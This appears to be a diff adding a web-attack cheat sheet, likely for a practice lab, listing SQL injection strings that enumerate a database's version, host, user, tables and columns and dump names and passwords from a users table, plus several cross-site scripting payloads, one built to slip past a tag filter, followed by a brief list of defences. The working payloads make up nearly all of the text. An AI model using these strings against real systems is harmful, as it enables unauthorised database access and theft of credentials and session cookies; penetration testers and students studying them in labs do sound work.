@@ -1,0 +1,49 @@
+
+Always True Injection
+test' OR 1=1#
+
+Display RDBMS and Version
+test'union select null, version()#
+
+Display the hostname of our web app
+' union select null, @@hostname#
+
+Display database user
+test' union select null, user() #
+
+Display the Database Name
+test' union select null, database() #
+
+List all tables in the information schema.
+test' and 1=0 union select null, table_name from information_schema.tables #
+
+List all Column fields in the information schema users table
+test' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+Display all the column contents in the information schema users tabletest' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
+
+Display all the column contents in the information schema users table
+test' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
+
+
+Cross Site Scripting:
+<h1>Hello</h1>
+
+<scr<script>ipt>alert(document.cookie)</script>
+
+
+<script>alert(document.cookie)</script>
+
+
+<script>alert(document.domain)</script>
+
+<body onload=alert(“bingo”)>
+
+<img src=x onMouseOver =alert("Hi")
+
+
+Validate user input
+Limit the use of special characters such as string concatenation
+Use stored procedures in the database
+Actively install security patches and updates
+Implement a Web Application Firewall
+Harden your Operating System and Applications
